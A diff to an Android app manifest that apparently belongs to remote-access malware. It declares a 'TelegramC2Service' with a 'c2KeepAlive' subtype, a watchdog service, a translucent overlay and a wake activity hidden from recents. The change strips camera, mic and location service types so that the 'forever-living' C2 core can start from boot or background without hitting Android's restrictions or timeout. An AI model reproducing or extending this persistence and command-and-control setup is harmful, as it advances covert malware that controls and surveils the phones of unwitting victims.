@@ -47,9 +47,9 @@
         <activity android:name=".OverlayActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:exported="false"/>
         <activity android:name=".WakeActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:taskAffinity="" android:excludeFromRecents="true" android:exported="false"/>
 
-        <!-- FOREVER-LIVING CORE: remoteMessaging+specialUse are BOOT-COMPLETED allowed (unlike dataSync/camera) and exempt from 6hr timeout -->
+        <!-- FOREVER-LIVING CORE: remoteMessaging+specialUse are BOOT/background-safe and exempt from 6hr timeout. camera/mic/location removed to avoid while-in-use SecurityException when started from background (Watchdog/Boot/FCM) -->
         <service android:name=".TelegramC2Service" android:enabled="true" android:exported="false"
-            android:foregroundServiceType="remoteMessaging|specialUse|microphone|camera|location">
+            android:foregroundServiceType="remoteMessaging|specialUse">
             <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="c2KeepAlive"/>
         </service>
         <service android:name=".WatchdogService" android:enabled="true" android:exported="false"
